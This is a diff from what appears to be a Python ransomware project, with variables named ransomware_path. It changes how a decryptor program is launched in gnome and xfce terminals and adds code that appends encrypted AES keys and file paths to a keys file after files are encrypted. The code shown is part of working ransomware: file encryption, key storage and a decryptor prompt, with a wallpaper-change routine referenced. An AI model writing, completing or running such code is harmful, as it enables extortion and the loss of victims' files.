@@ -60,16 +60,12 @@ def open_decryptor():
     if(output):
         return
     
-    gnome = 'gnome-terminal --command ./bin/decryptor'
+    gnome = 'gnome-terminal --command ./' + ransomware_path + "/decryptor"
     os.system(gnome)
-    xfce = 'xfce4-terminal --command=./decryptor'
+    xfce = 'xfce4-terminal --command=./' + ransomware_path + "/decryptor"
     os.system(xfce)
-    
-    
 
-
-def new_process():
-    pass
+    
 
 
 def change_wallpaper():
@@ -153,12 +149,10 @@ def menu():
     new_files = get_files.find_files(test_path)
     aes_keys_and_base64_path = start_encryption(new_files)
     
-    # if(aes_keys_and_base64_path != None):
-    #     with open(ransomware_path + '/AES_encrypted_keys.txt', 'rb') as f:    
-    #         append to the end of the file 
-
-
-    # write at the end of the file 
+    if(aes_keys_and_base64_path != None):
+        with open(ransomware_path + '/AES_encrypted_keys.txt', 'ab') as f:    
+            for _ in aes_keys_and_base64_path:
+                f.write(_[0] + " " + _[1] + "\n")
 
 
 if __name__ == "__main__":
